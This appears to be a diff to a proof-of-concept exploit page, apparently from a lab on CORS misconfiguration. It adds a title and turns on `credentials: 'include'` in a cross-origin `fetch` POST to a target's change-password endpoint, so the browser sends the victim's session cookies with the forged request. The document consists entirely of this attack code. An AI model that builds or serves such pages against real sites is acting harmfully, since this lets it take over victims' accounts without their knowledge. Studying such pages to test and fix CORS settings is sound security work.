@@ -1,6 +1,6 @@
 <html>
 <body>
-
+<h2> Change Password Permissive Wildcard </h2>
 <script>
   fetch("http://target:8000/xploitSCC/chg_pwd_wildcard", {
         method: "POST",
@@ -8,7 +8,7 @@
         headers: {
           'Content-Type': 'application/json'                          
         },
-        // credentials: 'include'
+        credentials: 'include'
     })
     .then(response => response.text())
     .then((response) => {
